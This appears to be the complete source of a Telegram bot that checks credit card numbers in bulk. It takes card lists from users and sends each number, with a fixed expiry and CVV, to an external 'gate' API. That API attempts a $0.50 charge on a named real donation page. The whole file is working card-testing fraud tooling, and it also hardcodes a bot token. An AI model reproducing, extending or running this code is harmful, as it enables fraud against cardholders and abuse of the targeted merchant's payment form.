import os
import re
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

TOKEN = '8692960014:AAEpYPo0XTj8F2DmAeUgdaf9_w06MWFYDeI'
API_URL = "http://gatescheck.duckdns.org:7000/check"

def check_card_api(card_number):
    params = {
        "url": "https://raybensch.com/donations/support-ray/",
        "card": f"{card_number}|09|28|092",
        "amount": 0.50
    }
    try:
        response = requests.get(API_URL, params=params)
        data = response.json()
        result = data.get('result', 'Unknown result')
        
        # Handle error responses or unexpected data formats
        if isinstance(result, dict) and 'error' in result:
            return result['error']
        elif isinstance(result, str):
            return result
        else:
            return "Unknown result format"
    except Exception as e:
        return f"Error during verification: {e}"

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Ensure 'downloads' directory exists
        if not os.path.exists('downloads'):
            os.makedirs('downloads')

        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        # Read the file and verify cards
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        for line in lines:
            line = line.strip()
            card_number_matches = re.findall(r'\d+', line)
            if card_number_matches:
                card_number = card_number_matches[0]
                result = check_card_api(card_number)
                await update.message.reply_text(f"Card: {line} - Result: {result}")
            else:
                await update.message.reply_text(f"No card number found in line: {line}")

    except Exception as e:
        await update.message.reply_text(f"Error processing file: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        'Hello! Send me a text file to verify credit cards.\n'
        'Or use the /pp command to verify a single card. Example: /pp 1234567890123456'
    )

# New command for individual card verification
async def pp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Please send the card number after the command. Example: /pp 1234567890123456")
        return
    card_number = context.args[0]
    result = check_card_api(card_number)
    await update.message.reply_text(f"Verification result for card {card_number}: {result}")

def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    app.run_polling()

if __name__ == '__main__':
    main()
